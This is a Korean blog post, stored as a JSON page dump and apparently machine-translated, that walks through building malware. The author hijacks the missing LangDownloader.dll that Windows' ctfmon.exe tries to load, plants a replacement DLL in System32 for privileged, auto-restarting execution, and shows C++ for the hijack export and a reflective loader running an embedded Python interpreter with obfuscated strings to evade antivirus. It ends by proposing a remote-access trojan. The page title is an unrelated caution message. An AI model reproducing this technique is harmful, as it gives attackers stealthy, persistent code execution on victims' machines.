{"pageProps":{"post":{"title":"제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다","description":"","date":"2024-06-19 01:15","slug":"2024-06-19-Writemesomemalware","content":"\n\n(연구 목적으로만 사용)\n\n# 이루고 싶은 것:\n\n# 어떻게 로드할 것인가:\n\nWindows에는 ctfmon.exe라는 멋진 프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_0.png)\n\n- 높은 권한에서 실행됩니다.\n- 충돌/중단 시 다시 시작하는 서비스가 있습니다.\n- 모든 Windows 컴퓨터에서 실행됩니다.\n\n\n<div class=\"content-ad\"></div>\n\n해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.\n\n\"virtual alloc — create remote thread\" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.\n\n## ctfmon.exe에 로드하는 멋진 방법 찾기\n\nProcmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_1.png\" />\n\n음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_2.png\" />\n\nLangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n{\n    switch (ul_reason_for_call)\n    {\n\n    case DLL_PROCESS_ATTACH:\n        {\n        MessageBoxA(0, std::to_string(GetCurrentProcessId()).c_str(), 0, 0);\n        break;\n        }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n```\n\n메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(\n\nLangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_3.png)\n\n\n<div class=\"content-ad\"></div>\n\n이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?\n\nProcmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요\n\n![image](/assets/img/2024-06-19-Writemesomemalware_4.png)\n\n여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.\n\n<div class=\"content-ad\"></div>\n\n해당 문자열을 찾았습니다!\n\n![image](/assets/img/2024-06-19-Writemesomemalware_5.png)\n\n여기서 잘 로드되고 있네요. 이제 뭘 할까요?\n\n![image](/assets/img/2024-06-19-Writemesomemalware_6.png)\n\n<div class=\"content-ad\"></div>\n\n한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:\n\n![image 1](/assets/img/2024-06-19-Writemesomemalware_7.png)\n\n![image 2](/assets/img/2024-06-19-Writemesomemalware_8.png)\n\n이 코드를 한 번 분석해 봐요.\n\n<div class=\"content-ad\"></div>\n\n```js\n• LangDownloader.dll을로드하려고 시도합니다.\n• 실패하는 경우\n  - “종료”로 계속 진행합니다.\n• 성공하는 경우\n  - LangDownloaderCreate의 주소를 가져오려고 시도합니다.\n  - 실패하는 경우\n     프로세스 종료\n  - 성공하는 경우\n     매개변수와 함께 LangDownloaderCreate를 호출합니다\n```\n\n지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_9.png\" />\n\n우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nextern \"C\" __declspec(dllexport) int LangDownloaderCreate(int a, int b)\n{\n    // 영원히 기다려요\n    HANDLE never_set = CreateEventA(NULL, TRUE, FALSE, NULL);\n    WaitForSingleObject(never_set, INFINITE);\n\n    return -1;\n}\n```\n\n알겠어요!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_10.png)\n\n이제 실행 중이니까... 뭘 하고 싶어요?\n\n<div class=\"content-ad\"></div>\n\n# 무엇을 실행할까요:\n\n제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요\n\n배운 바에 의하면, 파이썬은 python`버전`.dll을 사용해서 모든 파이썬 작업을 처리해요\n\n이 .dll을 멋지게 C++ 인터페이스로 감싸봐요\n\n<div class=\"content-ad\"></div>\n\n```js\nclass PythonInterpreter\n{\npublic:\n    explicit PythonInterpreter();\n    ~PythonInterpreter();\n\n    NO_DISCARD void* run_line(const std::string& line);\n\n    // Deleted Functions\n    PythonInterpreter(const PythonInterpreter& other) = delete;\n    PythonInterpreter(PythonInterpreter&& other) = delete;\n    PythonInterpreter& operator=(const PythonInterpreter& other) = delete;\n    PythonInterpreter& operator=(PythonInterpreter&& other) = delete;\n\nprivate:\n    using PyObject = int;\n\n    using PyInitializeType = void (*)();\n    using PyFinalizeType = void (*)();\n    using PyRunSimpleStringType = PyObject * (*)(const char* str);\n\n    // Members\n    DynamicLibrary m_python_interpreter_library;\n    PyInitializeType m_initialize;\n    PyFinalizeType m_finalize;\n    PyRunSimpleStringType m_run_simple_string;\n};\n\nPythonInterpreter::PythonInterpreter() :\n    m_python_interpreter_library(WindowsResource::get_resource(GetModuleHandleA(OBFUSCATE(\"LangDownloader.dll\")),\n                                                               IDR_BINARY1,\n                                                               OBFUSCATE(\"Binary\"))),\n    m_initialize(static_cast<PyInitializeType>(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Initialize\")))),\n    m_finalize(static_cast<PyFinalizeType>(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Finalize\")))),\n    m_run_simple_string(static_cast<PyRunSimpleStringType>(m_python_interpreter_library.get_function(OBFUSCATE(\"PyRun_SimpleString\"))))\n{\n    m_initialize();\n}\n```\n\n이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.\n\nDynamicLibrary 클래스를 만들어야 합니다.\n\n```js\nclass DynamicLibrary\n{\npublic:\n    explicit DynamicLibrary(ByteSpan library_binary);\n    ~DynamicLibrary();\n\n    NO_DISCARD void* get_function(const std::string& function_name);\n\n    // Deleted Functions\n    DynamicLibrary(const DynamicLibrary& other) = delete;\n    DynamicLibrary(DynamicLibrary&& other) = delete;\n    DynamicLibrary& operator=(const DynamicLibrary& other) = delete;\n    DynamicLibrary& operator=(DynamicLibrary&& other) = delete;\n\nprivate:\n    NO_DISCARD static HMEMORYMODULE load_library(ByteSpan library_binary);\n\n    // Members\n    HMEMORYMODULE m_library_base;\n};\n```\n\n<div class=\"content-ad\"></div>\n\n이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_11.png)\n\n정말 멋지죠? \n\n이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.\n\n<div class=\"content-ad\"></div>\n\n미안해요! 전손을 올립니다(:\n\n![Image](/assets/img/2024-06-19-Writemesomemalware_12.png)","ogImage":{"url":"/assets/img/2024-06-19-Writemesomemalware_0.png"},"coverImage":"/assets/img/2024-06-19-Writemesomemalware_0.png","tag":["Tech"],"readingTime":6},"content":"<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta content=\"width=device-width, initial-scale=1\" name=\"viewport\">\n</head>\n<body>\n<p>(연구 목적으로만 사용)</p>\n<h1>이루고 싶은 것:</h1>\n<h1>어떻게 로드할 것인가:</h1>\n<p>Windows에는 ctfmon.exe라는 멋진 프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.</p>\n<div class=\"content-ad\"></div>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_0.png\" alt=\"이미지\"></p>\n<ul>\n<li>높은 권한에서 실행됩니다.</li>\n<li>충돌/중단 시 다시 시작하는 서비스가 있습니다.</li>\n<li>모든 Windows 컴퓨터에서 실행됩니다.</li>\n</ul>\n<div class=\"content-ad\"></div>\n<p>해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.</p>\n<p>\"virtual alloc — create remote thread\" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.</p>\n<h2>ctfmon.exe에 로드하는 멋진 방법 찾기</h2>\n<p>Procmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.</p>\n<div class=\"content-ad\"></div>\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_1.png\">\n<p>음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.</p>\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_2.png\">\n<p>LangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-variable constant_\">BOOL</span> <span class=\"hljs-variable constant_\">APIENTRY</span> <span class=\"hljs-title class_\">DllMain</span>(<span class=\"hljs-variable constant_\">HMODULE</span> hModule,\n    <span class=\"hljs-variable constant_\">DWORD</span>  ul_reason_for_call,\n    <span class=\"hljs-variable constant_\">LPVOID</span> lpReserved\n)\n{\n    <span class=\"hljs-keyword\">switch</span> (ul_reason_for_call)\n    {\n\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-attr\">DLL_PROCESS_ATTACH</span>:\n        {\n        <span class=\"hljs-title class_\">MessageBoxA</span>(<span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">std</span>::<span class=\"hljs-title function_\">to_string</span>(<span class=\"hljs-title class_\">GetCurrentProcessId</span>()).<span class=\"hljs-title function_\">c_str</span>(), <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>);\n        <span class=\"hljs-keyword\">break</span>;\n        }\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-attr\">DLL_THREAD_ATTACH</span>:\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-attr\">DLL_THREAD_DETACH</span>:\n    <span class=\"hljs-keyword\">case</span> <span class=\"hljs-attr\">DLL_PROCESS_DETACH</span>:\n        <span class=\"hljs-keyword\">break</span>;\n    }\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable constant_\">TRUE</span>;\n}\n</code></pre>\n<p>메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(</p>\n<p>LangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_3.png\" alt=\"이미지\"></p>\n<div class=\"content-ad\"></div>\n<p>이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?</p>\n<p>Procmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_4.png\" alt=\"image\"></p>\n<p>여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.</p>\n<div class=\"content-ad\"></div>\n<p>해당 문자열을 찾았습니다!</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_5.png\" alt=\"image\"></p>\n<p>여기서 잘 로드되고 있네요. 이제 뭘 할까요?</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_6.png\" alt=\"image\"></p>\n<div class=\"content-ad\"></div>\n<p>한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_7.png\" alt=\"image 1\"></p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_8.png\" alt=\"image 2\"></p>\n<p>이 코드를 한 번 분석해 봐요.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\">• <span class=\"hljs-title class_\">LangDownloader</span>.<span class=\"hljs-property\">dll</span>을로드하려고 시도합니다.\n• 실패하는 경우\n  - “종료”로 계속 진행합니다.\n• 성공하는 경우\n  - <span class=\"hljs-title class_\">LangDownloaderCreate</span>의 주소를 가져오려고 시도합니다.\n  - 실패하는 경우\n     프로세스 종료\n  - 성공하는 경우\n     매개변수와 함께 <span class=\"hljs-title class_\">LangDownloaderCreate</span>를 호출합니다\n</code></pre>\n<p>지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.</p>\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_9.png\">\n<p>우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\">extern <span class=\"hljs-string\">\"C\"</span> <span class=\"hljs-title function_\">__declspec</span>(dllexport) int <span class=\"hljs-title class_\">LangDownloaderCreate</span>(int a, int b)\n{\n    <span class=\"hljs-comment\">// 영원히 기다려요</span>\n    <span class=\"hljs-variable constant_\">HANDLE</span> never_set = <span class=\"hljs-title class_\">CreateEventA</span>(<span class=\"hljs-variable constant_\">NULL</span>, <span class=\"hljs-variable constant_\">TRUE</span>, <span class=\"hljs-variable constant_\">FALSE</span>, <span class=\"hljs-variable constant_\">NULL</span>);\n    <span class=\"hljs-title class_\">WaitForSingleObject</span>(never_set, <span class=\"hljs-variable constant_\">INFINITE</span>);\n\n    <span class=\"hljs-keyword\">return</span> -<span class=\"hljs-number\">1</span>;\n}\n</code></pre>\n<p>알겠어요!</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_10.png\" alt=\"이미지\"></p>\n<p>이제 실행 중이니까... 뭘 하고 싶어요?</p>\n<div class=\"content-ad\"></div>\n<h1>무엇을 실행할까요:</h1>\n<p>제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요</p>\n<p>배운 바에 의하면, 파이썬은 python<code>버전</code>.dll을 사용해서 모든 파이썬 작업을 처리해요</p>\n<p>이 .dll을 멋지게 C++ 인터페이스로 감싸봐요</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">PythonInterpreter</span>\n{\n<span class=\"hljs-attr\">public</span>:\n    explicit <span class=\"hljs-title class_\">PythonInterpreter</span>();\n    ~<span class=\"hljs-title class_\">PythonInterpreter</span>();\n\n    <span class=\"hljs-variable constant_\">NO_DISCARD</span> <span class=\"hljs-keyword\">void</span>* <span class=\"hljs-title function_\">run_line</span>(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-attr\">std</span>::string&#x26; line);\n\n    <span class=\"hljs-comment\">// Deleted Functions</span>\n    <span class=\"hljs-title class_\">PythonInterpreter</span>(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">PythonInterpreter</span>&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n    <span class=\"hljs-title class_\">PythonInterpreter</span>(<span class=\"hljs-title class_\">PythonInterpreter</span>&#x26;&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n    <span class=\"hljs-title class_\">PythonInterpreter</span>&#x26; operator=(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">PythonInterpreter</span>&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n    <span class=\"hljs-title class_\">PythonInterpreter</span>&#x26; operator=(<span class=\"hljs-title class_\">PythonInterpreter</span>&#x26;&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n\n<span class=\"hljs-attr\">private</span>:\n    using <span class=\"hljs-title class_\">PyObject</span> = int;\n\n    using <span class=\"hljs-title class_\">PyInitializeType</span> = <span class=\"hljs-keyword\">void</span> (*)();\n    using <span class=\"hljs-title class_\">PyFinalizeType</span> = <span class=\"hljs-keyword\">void</span> (*)();\n    using <span class=\"hljs-title class_\">PyRunSimpleStringType</span> = <span class=\"hljs-title class_\">PyObject</span> * (*)(<span class=\"hljs-keyword\">const</span> char* str);\n\n    <span class=\"hljs-comment\">// Members</span>\n    <span class=\"hljs-title class_\">DynamicLibrary</span> m_python_interpreter_library;\n    <span class=\"hljs-title class_\">PyInitializeType</span> m_initialize;\n    <span class=\"hljs-title class_\">PyFinalizeType</span> m_finalize;\n    <span class=\"hljs-title class_\">PyRunSimpleStringType</span> m_run_simple_string;\n};\n\n<span class=\"hljs-title class_\">PythonInterpreter</span>::<span class=\"hljs-title class_\">PythonInterpreter</span>() :\n    <span class=\"hljs-title function_\">m_python_interpreter_library</span>(<span class=\"hljs-title class_\">WindowsResource</span>::<span class=\"hljs-title function_\">get_resource</span>(<span class=\"hljs-title class_\">GetModuleHandleA</span>(<span class=\"hljs-title function_\">OBFUSCATE</span>(<span class=\"hljs-string\">\"LangDownloader.dll\"</span>)),\n                                                               <span class=\"hljs-variable constant_\">IDR_BINARY1</span>,\n                                                               <span class=\"hljs-title function_\">OBFUSCATE</span>(<span class=\"hljs-string\">\"Binary\"</span>))),\n    <span class=\"hljs-title function_\">m_initialize</span>(static_cast&#x3C;<span class=\"hljs-title class_\">PyInitializeType</span>>(m_python_interpreter_library.<span class=\"hljs-title function_\">get_function</span>(<span class=\"hljs-title function_\">OBFUSCATE</span>(<span class=\"hljs-string\">\"Py_Initialize\"</span>)))),\n    <span class=\"hljs-title function_\">m_finalize</span>(static_cast&#x3C;<span class=\"hljs-title class_\">PyFinalizeType</span>>(m_python_interpreter_library.<span class=\"hljs-title function_\">get_function</span>(<span class=\"hljs-title function_\">OBFUSCATE</span>(<span class=\"hljs-string\">\"Py_Finalize\"</span>)))),\n    <span class=\"hljs-title function_\">m_run_simple_string</span>(static_cast&#x3C;<span class=\"hljs-title class_\">PyRunSimpleStringType</span>>(m_python_interpreter_library.<span class=\"hljs-title function_\">get_function</span>(<span class=\"hljs-title function_\">OBFUSCATE</span>(<span class=\"hljs-string\">\"PyRun_SimpleString\"</span>))))\n{\n    <span class=\"hljs-title function_\">m_initialize</span>();\n}\n</code></pre>\n<p>이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.</p>\n<p>DynamicLibrary 클래스를 만들어야 합니다.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DynamicLibrary</span>\n{\n<span class=\"hljs-attr\">public</span>:\n    explicit <span class=\"hljs-title class_\">DynamicLibrary</span>(<span class=\"hljs-title class_\">ByteSpan</span> library_binary);\n    ~<span class=\"hljs-title class_\">DynamicLibrary</span>();\n\n    <span class=\"hljs-variable constant_\">NO_DISCARD</span> <span class=\"hljs-keyword\">void</span>* <span class=\"hljs-title function_\">get_function</span>(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-attr\">std</span>::string&#x26; function_name);\n\n    <span class=\"hljs-comment\">// Deleted Functions</span>\n    <span class=\"hljs-title class_\">DynamicLibrary</span>(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">DynamicLibrary</span>&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n    <span class=\"hljs-title class_\">DynamicLibrary</span>(<span class=\"hljs-title class_\">DynamicLibrary</span>&#x26;&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n    <span class=\"hljs-title class_\">DynamicLibrary</span>&#x26; operator=(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">DynamicLibrary</span>&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n    <span class=\"hljs-title class_\">DynamicLibrary</span>&#x26; operator=(<span class=\"hljs-title class_\">DynamicLibrary</span>&#x26;&#x26; other) = <span class=\"hljs-keyword\">delete</span>;\n\n<span class=\"hljs-attr\">private</span>:\n    <span class=\"hljs-variable constant_\">NO_DISCARD</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-variable constant_\">HMEMORYMODULE</span> <span class=\"hljs-title function_\">load_library</span>(<span class=\"hljs-title class_\">ByteSpan</span> library_binary);\n\n    <span class=\"hljs-comment\">// Members</span>\n    <span class=\"hljs-variable constant_\">HMEMORYMODULE</span> m_library_base;\n};\n</code></pre>\n<div class=\"content-ad\"></div>\n<p>이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_11.png\" alt=\"이미지\"></p>\n<p>정말 멋지죠?</p>\n<p>이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.</p>\n<div class=\"content-ad\"></div>\n<p>미안해요! 전손을 올립니다(:</p>\n<p><img src=\"/assets/img/2024-06-19-Writemesomemalware_12.png\" alt=\"Image\"></p>\n</body>\n</html>\n"},"__N_SSG":true}